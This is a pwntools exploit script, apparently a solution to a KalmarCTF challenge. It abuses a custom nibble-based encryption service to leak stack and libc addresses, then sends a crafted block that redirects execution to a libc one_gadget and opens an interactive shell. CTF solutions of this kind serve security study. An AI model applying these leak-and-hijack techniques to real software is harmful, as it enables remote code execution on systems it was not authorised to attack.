from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './challenge'
HOST = 'chal-kalmarc.tf'
PORT =  8

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def do_enc( karr, sarr, parr):
    nb = len(karr)
    assert len(karr) == nb
    assert len(sarr) == nb
    assert len(parr) == nb

    r.sendlineafter(b'blocks: ', str(nb).encode())
    for b in range(nb):
        assert len(karr[b]) == 16 
        assert len(sarr[b]) == 16
        assert len(parr[b]) == 16 

        r.recvuntil(f'block {b}: '.encode())
        for i in range(0, len(karr[b]), 2):
            val = (karr[b][i] << 4) + karr[b][i+1]
            r.sendline(f'{val:02x}'.encode())
        for i, s in enumerate(sarr[b]):
            r.recvuntil(f'block {b}: '.encode())
            r.sendline(f'{s:02x}'.encode())
        r.recvuntil(f'block {b}: '.encode())
        for i in range(0, len(parr[b]), 2):
            val = (parr[b][i] << 4) + parr[b][i+1]
            r.sendline(f'{val:02x}'.encode())

r = start()
if args.D:
	debug(r, [0x15a9])

def b2n(by):
    blocks = (len(by) // 8) + 1
    out = []
    tmp = []
    for b in by:
        tmp.append(b >> 4)
        tmp.append(b & 0xf)
        if len(tmp) == 0x10:
            out.append(tmp)
            tmp = []
    if tmp != []:
        while(len(tmp) < 0x10):
            tmp.append(0)
        out.append(tmp)
    return out

def shift(val, idx):
    if val & 1 == 1:
        return ((((((val >> 1) - (idx >> 1)) * 2) & 0xe) - (idx & 1)) + 1)
    else:
        return ((idx & 1) + ((idx >> 1) + (val >> 1)) * 2)

def invshift(shifted, idx):
    for i in range(0x10):
        ret = shift(i, idx)
        if ret & 0xf == shifted:
            return i
    assert False, "something wrong"

ans = []
sbox = [11, 3, 10, 5, 12, 13, 14, 6, 2, 0, 1, 8, 9, 15, 4, 7]
invsbox = [sbox.index(i) for i in range(0x10)]
for i in range(0x10):
    do_enc([[0]*0x10], [[0]+[0x10]*0xf], [[invsbox[i]]*0x10])
    r.recvuntil(b'Block 0: ')

    ans.append(int(r.recv(2) , 16))

leak = b''
for a in ans:
    lo = a & 0xf
    for i in range(0x10):
        cand = i * 0x10 + lo
        if cand * 0x10 + cand & 0xff == a:
            leak += (cand).to_bytes(1, 'little')

stack_leak = u64(leak[:8])
libc_leak = u64(leak[8:])
dbg('stack_leak')
base = libc_leak - 0x62142
dbg('base')
one = base + 0xebc85

def scramble(nib):
    v = 0
    v |= nib[0x3] << (4*0)
    v |= nib[0xb] << (4*1)
    v |= nib[0x5] << (4*2)
    v |= nib[0xa] << (4*3)
    v |= nib[0xd] << (4*4)
    v |= nib[0xc] << (4*5)
    v |= nib[0x6] << (4*6)
    v |= nib[0xe] << (4*7)
    v |= nib[0x0] << (4*8)
    v |= nib[0x2] << (4*9)
    v |= nib[0x8] << (4*10)
    v |= nib[0x1] << (4*11)
    v |= nib[0xf] << (4*12)
    v |= nib[0x9] << (4*13)
    v |= nib[0x7] << (4*14)
    v |= nib[0x4] << (4*15)
    print(hex(v))
    return v

dbg('one')
val = scramble(b2n(p64(one))[0])
do_enc([[10]*0x10], [[0xb0]+[0]*0xf], b2n(p64(val)))

r.interactive()
r.close()

